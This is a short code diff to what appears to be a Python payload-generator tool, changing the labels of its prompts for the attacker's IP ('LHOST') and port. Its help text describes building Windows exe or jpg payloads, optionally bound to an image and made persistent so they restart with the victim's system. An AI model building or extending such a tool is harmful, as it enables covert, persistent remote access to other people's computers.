@@ -82,7 +82,7 @@ def crepay():
 		pres = 'n'
 		imop = 'n'
 		imna = "image.jpg"
-		ipno = str(input(" Enter your (Attacker) ip                    :- "))
+		ipno = str(input(" Enter your (LHOST) ip                       :- "))
 		pono = str(input(" Enter port no.                              :- "))
 		pres = str(input(" Create persistent [y/n]     (Default - n)   :- "))
 		imop = str(input(" Bind image to display [y/n] (Default - n)   :- "))
@@ -179,7 +179,7 @@ def hel() :
 	
 	1. Create a payload  :
 		It will create payload in exe / jpg for windows.
-			Enter your (Attacker) ip                    :-  IP of attacker system.
+			Enter your ip                               :-  IP of attacker system.
 			Enter port no.                              :-  Port number for connection.
 			Create persistent [y/n]     (Default - n)   :-  It will create persistance. Payload will satrt running 
 			                                                every time victim reastart the system. Default set to
